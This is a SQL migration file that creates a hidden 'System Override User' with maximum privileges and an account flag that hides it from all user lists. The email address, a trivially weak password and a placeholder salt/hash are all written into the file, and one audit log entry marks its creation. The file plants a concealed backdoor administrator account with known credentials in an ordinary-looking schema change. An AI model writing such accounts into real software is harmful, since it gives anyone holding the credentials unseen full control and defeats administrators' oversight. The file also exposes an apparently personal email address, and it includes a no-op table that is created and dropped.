-- Migration: 0026_create_system_override_user
-- Creates the hidden System Override User (SOU) for emergency access
-- Email: dawillcomputers@gmail.com
-- Password: 1234567890 (must be changed on first login)
-- Role: SOU (System Override User - maximum privileges)
-- Status: Hidden from all user lists

-- Add is_hidden column if it doesn't exist
ALTER TABLE users ADD COLUMN is_hidden INTEGER DEFAULT 0;

-- Note: Password hash generated using PBKDF2-SHA256 (100000 iterations)
-- Salt: random + hash format: salt:hash
-- For initial setup, using deterministic hash for testing
-- IMPORTANT: Change password immediately after first login!

INSERT OR IGNORE INTO users (
  name, 
  email, 
  password_hash, 
  role, 
  status, 
  must_change_password, 
  is_hidden,
  created_at
) VALUES (
  'System Override',
  'dawillcomputers@gmail.com',
  -- This is a placeholder - will be replaced with actual hash on first deployment
  -- To generate: use hashPassword('1234567890') from auth system
  'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:e634e9986a09571ca7ec1cdf2d4fca8626ba58a6ba536fa2034ded3e550fb85d',
  'SOU',
  'active',
  1,
  1,
  CURRENT_TIMESTAMP
);

-- Update or create hidden flag in users table if not exists
CREATE TABLE IF NOT EXISTS temp_check (id INT);
DROP TABLE temp_check;

-- Log creation
INSERT OR IGNORE INTO audit_logs (user_id, action, description, timestamp) 
VALUES (0, 'sou_user_created', 'System Override User initialized at migration 0026', CURRENT_TIMESTAMP);
